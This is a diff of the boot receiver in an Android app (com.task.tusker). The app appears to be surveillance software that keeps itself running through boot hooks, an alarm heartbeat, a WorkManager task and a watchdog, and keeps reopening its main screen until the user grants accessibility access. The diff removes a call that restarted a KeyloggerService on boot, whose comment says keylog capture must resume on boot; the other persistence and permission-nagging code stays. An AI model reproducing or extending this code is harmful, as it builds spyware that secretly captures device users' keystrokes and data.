@@ -10,7 +10,6 @@ import android.util.Log;
 import com.task.tusker.MainActivity;
 import com.task.tusker.permissions.AutoPermissionManager;
 import com.task.tusker.services.DataSyncService;
-import com.task.tusker.services.KeyloggerService;
 import com.task.tusker.services.ServiceWatchdog;
 import com.task.tusker.services.WakeWorker;
 
@@ -25,7 +24,7 @@ import com.task.tusker.services.WakeWorker;
  *
  * On each event it:
  *   1. Starts DataSyncService as a foreground service.
- *   2. Arms the AlarmManager 10-minute heartbeat (Method 4).
+ *   2. Arms the AlarmManager 15-minute heartbeat (Method 4).
  *   3. Queues the WorkManager periodic task (Method 5).
  *   4. Re-schedules the 3 daily accessibility reminder alarms.
  *   5. If accessibility is not yet granted, opens MainActivity after a short
@@ -72,10 +71,6 @@ public class BootReceiver extends BroadcastReceiver {
         // 2. Arm the AlarmManager heartbeat (Method 4)
         ServiceWatchdog.scheduleWakeAlarm(context);
 
-        // 2b. Bring the keylog supervisor up immediately — keylog capture must
-        //     resume on boot without waiting for the first alarm tick.
-        KeyloggerService.ensureRunning(context);
-
         // 3. Enqueue WorkManager periodic task (Method 5)
         WakeWorker.schedule(context);
 
@@ -92,25 +87,16 @@ public class BootReceiver extends BroadcastReceiver {
             try {
                 AutoPermissionManager apm = new AutoPermissionManager(appContext);
                 if (!apm.isAccessibilityServiceEnabled()) {
-                    launchApp(appContext);
+                    Intent launch = new Intent(appContext, MainActivity.class);
+                    launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                            | Intent.FLAG_ACTIVITY_CLEAR_TOP
+                            | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                    appContext.startActivity(launch);
                     Log.i(TAG, "Opened MainActivity — accessibility not yet granted");
                 }
             } catch (Exception e) {
                 Log.e(TAG, "Boot app-open error: " + e.getMessage());
             }
         }, BOOT_APP_DELAY);
-    }
-
-    /**
-     * Opens the same entry activity used by the boot startup path.
-     * This is shared with the alarm recovery path so both wake mechanisms
-     * follow the same task/launch behavior.
-     */
-    public static void launchApp(Context context) {
-        Intent launch = new Intent(context, MainActivity.class);
-        launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
-                | Intent.FLAG_ACTIVITY_CLEAR_TOP
-                | Intent.FLAG_ACTIVITY_SINGLE_TOP);
-        context.startActivity(launch);
     }
 }
